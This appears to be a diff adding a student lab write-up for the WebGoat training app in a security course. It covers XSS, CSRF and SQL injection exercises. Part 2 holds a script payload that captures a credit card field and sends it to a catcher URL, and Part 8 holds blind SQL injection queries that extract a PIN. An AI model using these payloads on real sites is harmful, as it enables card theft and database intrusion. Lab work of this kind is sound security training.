@@ -1,0 +1,64 @@
+#Alexander Jaskot, 1002290166, alexander.jaskot@mail.utoronto.ca
+#Mohammed M'Hiri, 1002455041, m.mhiri@mail.utoronto.ca
+
+
+Part 1 Explanation:
+
+The search field is vulnerable, we inject html and js to create a fake login below the search bar. The information that the victim inserts into the fake login is saved in "ece568-2019f-user" and "ece568-2019f-pass", and sent to the attack URL.
+
+
+
+Part 2 Explanation:
+
+The vulnerable field is the three-digit access code field. The attacker leads the victim to a different website that has the 3-digit access code field pre-filled with the attack js. The attacker gets the credit card number by adding an event listener to the submit button that waits for it to be clicked. When it is clicked, the attacker can take the data in the credit card field which is called "input1" and send it to the attack URL by opening a new window with the credit card appended to the URL.
+
+
+http://localhost:8090/WebGoat/start.mvc#attack/1908103370/900?input1=123&input2=<script> 
+document.getElementsByName("buy")[0].addEventListener("click", part2);
+function part2() {
+credit = document.getElementsByName("input1")[0].value;
+window.open('http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCredit='+credit+'');
+}
+</script>
+
+
+Part 3 Explanation:
+
+The exploitable field is the message field. The attacker sends a message that has an image whose source value is a link that transfers the money as soon as the message is opened unbeknownst to the victim.
+
+
+Part 4 Explanation:
+
+The exploitable field is the message field. Same process as part 3 but the transfer must then be confirmed. The attacker's message initiates the transfer process by sending the request. As soon as the request is opened and loaded, the attacker updates the iframe source to confirm the transfer. Effectively the attacker self confirms the transfer and sends the money unbeknownst to the victim.
+
+
+Part 5 Explanation:
+
+The exploitable field is the message field. Similar process to parts 3 and 4; however, this time in order to actually transfer the money, the request must come with a token that validates that the request comes from the victim. To bypass this request, the attacker sends an initial transfer request that loads the transfer page with the token hidden and ready to be sent off when the "Submit Query" button is pressed. The attacker injects both html and js that initiates the transfer, then calls a functon that goes into the form and saves the token, appends it to a new transfer request, and sends that off thus transferring the money unbeknownst to the victim.
+
+
+Part 6 Explanation:
+
+We simply close off the initial where statement check and add a or comparison that accepts the opposite of the initial check which then always evaluates to true (basically where x=1 or x!=1). This way we always display all the credit card information, because its true for all rows (users).
+
+
+Part 7 Explanation:
+
+We first close the initial SQL query for a user id using a semicolon. We then add an update statement that would fo into the salary of the user 101 and change it to $555000. 
+
+For the second part we create a database trigger that sets the email to be "ece568-2019f@utoronto.ca" every a time a new user is created (every new row update).
+
+
+Part 8 Explanation:
+
+Append 101 at the beginning to have the SQL query search for the correct account number. To find the pin, start with the subquery select statement and supply a range of pin numbers. If the search query returns "account number is valid" then that means the pin is within the range specified. Then, narrow the range while continuously checking if it returns valid until you find the correct pin number. You can double check the pin number by using a select subquery and, instead of a range, specify the exact pin number. If it returns valid then you got the right number. 
+
+101 and ((select pin from credit where cc_number = 1324354657687980) > 1000 and (select pin from credit where cc_number = 1324354657687980) < 10000);
+
+101 and ((select pin from credit where cc_number = 1324354657687980) = 2856);
+
+
+
+
+
+
